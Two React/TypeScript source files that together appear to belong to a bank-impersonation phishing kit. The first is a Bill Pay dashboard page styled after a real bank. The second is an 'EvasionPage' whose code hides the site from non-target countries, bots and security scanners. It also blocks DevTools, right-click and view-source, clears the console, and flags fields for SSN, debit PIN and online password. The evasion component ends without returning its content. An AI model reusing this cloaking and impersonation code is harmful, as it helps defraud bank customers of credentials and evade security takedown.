import DashboardLayout from "@/components/DashboardLayout";
import { useState } from "react";
import { billPayees, formatCurrency } from "@/data/accountData";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle, Plus, Receipt } from "lucide-react";

const BillPay = () => {
  const [selectedPayee, setSelectedPayee] = useState<number | null>(null);
  const [amount, setAmount] = useState("");
  const [paymentDate, setPaymentDate] = useState("");
  const [success, setSuccess] = useState(false);
  const [showAddPayee, setShowAddPayee] = useState(false);

  const handlePay = (e: React.FormEvent) => {
    e.preventDefault();
    if (!selectedPayee || !amount) return;
    setSuccess(true);
    setTimeout(() => setSuccess(false), 4000);
    setAmount("");
    setSelectedPayee(null);
  };

  return (
    <DashboardLayout>
      <div className="max-w-3xl mx-auto space-y-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-semibold text-foreground">Bill Pay</h1>
            <p className="text-sm text-muted-foreground">Pay your bills quickly and securely</p>
          </div>
          <Button
            variant="outline"
            size="sm"
            onClick={() => setShowAddPayee(!showAddPayee)}
            className="border-[#012169] text-[#012169] hover:bg-[#012169] hover:text-white"
          >
            <Plus className="h-4 w-4 mr-1" /> Add Payee
          </Button>
        </div>

        {success && (
          <div className="flex items-center gap-3 bg-success/10 border border-success/20 text-success rounded-lg p-4 animate-fade-in">
            <CheckCircle className="h-5 w-5" />
            <span className="text-sm font-medium">Payment scheduled successfully!</span>
          </div>
        )}

        {showAddPayee && (
          <div className="bg-card border border-border rounded-xl p-5 shadow-card animate-fade-in space-y-4">
            <h3 className="font-semibold text-foreground">Add New Payee</h3>
            <div className="grid md:grid-cols-2 gap-4">
              <Input placeholder="Payee Name" />
              <Input placeholder="Account Number" />
            </div>
            <div className="flex gap-3">
              <Button size="sm" className="bg-[#E31837] hover:bg-[#c4162f] text-white">Save Payee</Button>
              <Button size="sm" variant="outline" onClick={() => setShowAddPayee(false)}>Cancel</Button>
            </div>
          </div>
        )}

        {/* Payees list */}
        <div className="bg-card border border-border rounded-xl shadow-card">
          <div className="px-5 py-4 border-b border-border">
            <h2 className="font-semibold text-foreground">Your Payees</h2>
          </div>
          <div className="divide-y divide-border">
            {billPayees.map((payee) => (
              <div
                key={payee.id}
                onClick={() => { setSelectedPayee(payee.id); setAmount(payee.amount.toString()); }}
                className={`flex items-center justify-between px-5 py-4 cursor-pointer transition-colors ${
                  selectedPayee === payee.id ? "bg-red-50 border-l-2 border-l-[#E31837]" : "hover:bg-gray-50"
                }`}
              >
                <div className="flex items-center gap-3">
                  <div className="h-10 w-10 rounded-full bg-secondary flex items-center justify-center">
                    <Receipt className="h-4 w-4 text-foreground" />
                  </div>
                  <div>
                    <p className="text-sm font-medium text-foreground">{payee.name}</p>
                    <p className="text-xs text-muted-foreground">Account: {payee.accountNumber}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-sm font-semibold text-foreground">{formatCurrency(payee.amount)}</p>
                  <p className="text-xs text-muted-foreground">Due: {payee.nextDue}</p>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Payment form */}
        {selectedPayee && (
          <form onSubmit={handlePay} className="bg-card border border-border rounded-xl p-6 shadow-card space-y-4 animate-fade-in">
            <h3 className="font-semibold text-foreground">
              Pay {billPayees.find(p => p.id === selectedPayee)?.name}
            </h3>
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <label className="text-sm font-medium text-foreground block mb-1.5">Amount</label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground text-sm">$</span>
                  <Input type="number" step="0.01" value={amount} onChange={(e) => setAmount(e.target.value)} className="pl-7" required />
                </div>
              </div>
              <div>
                <label className="text-sm font-medium text-foreground block mb-1.5">Payment Date</label>
                <Input type="date" value={paymentDate} onChange={(e) => setPaymentDate(e.target.value)} required />
              </div>
            </div>
            <Button type="submit" className="bg-[#E31837] hover:bg-[#c4162f] text-white">
              Schedule Payment
            </Button>
          </form>
        )}
      </div>
    </DashboardLayout>
  );
};

export default BillPay;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

  
}